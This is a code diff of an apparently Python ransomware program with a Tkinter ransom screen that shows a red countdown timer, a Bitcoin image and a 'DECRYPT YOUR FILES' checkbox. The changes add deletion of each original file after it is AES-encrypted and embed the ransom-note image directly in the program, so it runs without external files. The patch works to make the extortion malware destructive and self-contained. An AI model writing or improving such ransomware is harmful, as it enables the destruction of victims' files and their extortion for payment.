@@ -13,7 +13,7 @@ from PIL import Image, ImageTk
 import time
 import sys
 from myimages import *
-pic=imageString#GIF decoded to string. imageString from myimages.py
+pic = imageString#GIF decoded to string. imageString from myimages.py
 startdirs = ['/Users/test/Desktop']
 
 
@@ -123,7 +123,8 @@ def encrypt(key, filename):
                 # Writes out the encrypted chunksize
                 outfile.write(encryptor.encrypt(chunk))
 
-
+    os.remove(filename)
+    
 def decrypt(key, filename):
     chunksize = 64 * 1024
 
@@ -149,6 +150,7 @@ def decrypt(key, filename):
             # Reduces all of the padding added above, reducing to the original filesize before encryption
             outfile.truncate(filesize)
 
+    os.remove(filename)
 
 def getKey(password):
     hasher = SHA256.new(password)
@@ -255,15 +257,15 @@ timer = Label(root, font=("ARIAL", 40, "bold"), bg="RED", width=14).place(x=250,
 ListRandomNumbers()
 
 #CODE to display the description
-DescriptionImage = Image.open("Capture.GIF")
-tkimage = ImageTk.PhotoImage(DescriptionImage)
+#DescriptionImage = Image.open("Capture.GIF")
+tkimage = PhotoImage(data=pic)
 LabelIt = Label(root, image=tkimage, relief="sunken").pack()
 
 #Bitcoin Image
-BitcoinImage = Image.open("bitcoin.png")
-BC = ImageTk.PhotoImage(BitcoinImage)
-LabelIt2 = Label(root, image=BC, height=100)
-LabelIt2.place(x=200, y=535)
+#BitcoinImage = Image.open("bitcoin.png")
+#BC = ImageTk.PhotoImage(BitcoinImage)
+#LabelIt2 = Label(root, image=BC, height=100)
+#LabelIt2.place(x=200, y=535)
 
 #These are to display the check button boxes
 Chooser = Checkbutton(root, bg="BLUE", text="DECRYPT YOUR FILES").place(x=25, y=500)
